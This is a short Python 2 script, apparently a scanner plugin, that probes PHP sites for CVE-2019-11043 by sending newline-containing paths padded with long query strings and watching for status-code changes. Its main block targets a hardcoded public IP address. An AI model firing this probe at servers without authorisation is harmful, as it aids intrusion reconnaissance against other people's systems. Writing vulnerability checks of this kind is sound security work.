# -*- coding: utf-8 -*-
# 19/10/24
# CVE-2019-11043

import urllib2
import urllib

LOGRES = ""
MinQSL               = 1500
MaxQSL               = 1950
MaxQSLCandidates     = 10
base_path = "/path\ninfo.php"
BreakingPayload = "/PHP\nis_the_shittiest_lang.php"

class RedirctHandler(urllib2.HTTPRedirectHandler):
    def http_error_301(self, req, fp, code, msg, headers):
        pass

    def http_error_302(self, req, fp, code, msg, headers):
        pass


def gen_qsl(len):
    return "Q" * len

def run_test(url, port):
    global LOGRES
    debug_handler = urllib2.HTTPHandler(debuglevel = 0)
    opener = urllib2.build_opener(debug_handler, RedirctHandler)
    # get base status
    req_url = url + urllib2.quote(base_path)
    
    print req_url
    
    req_url = req_url + "?" + gen_qsl(MinQSL)
    
    try:
        r = opener.open(req_url,timeout=3)
        base_code = r.getcode()
    except urllib2.HTTPError, e:
        base_code = e.code
    except BaseException, e:
        return False
            
    print base_code
    
    req_url = url + urllib2.quote(BreakingPayload)
    
    qslCandidates = []
    
    for i in range(MinQSL, MaxQSL, 5):
        check_url = req_url + "?" + gen_qsl(i)
        try:
            r = opener.open(check_url,timeout=5)
            check_code = r.getcode()
        except urllib2.HTTPError, e:
            check_code = e.code
        except BaseException, e:
            return False
        
        if not check_code == base_code:
            LOGRES = "vul pos = " + str(i)
            qslCandidates.append(i)
           
    
    if len(qslCandidates) == 0:
        return False
    
    if len(qslCandidates) > MaxQSLCandidates:
        return False
    else:
        return True
        
    return False

def run(params, timeout = 0):
    url = ""
    port = 80
    if params.has_key("IP"):
        url = params["IP"]
    elif params.has_key("URL"):
        url = params["URL"]
    else:
        raise Exception("PYTHON_PARAMETER_ERROR")
    
    if not url.endswith(".php"):
        raise Exception("PYTHON_PARAMETER_ERROR")
    
    if run_test(url, port):
        return {'result':'1', 'originalResult':LOGRES}
    else:
        return {'result':'0', 'originalResult':LOGRES}
    
def information():
    info = {}
    info['input'] = {'url':[],'port':['443','80']}
    info['check'] = {'suffix':['php'],'svc':['https','http'],'timeout':'3'}
    return info 

if __name__ == "__main__":
    print run({'PORT':'80', 'URL':'http://120.210.134.49:8000/index.php'})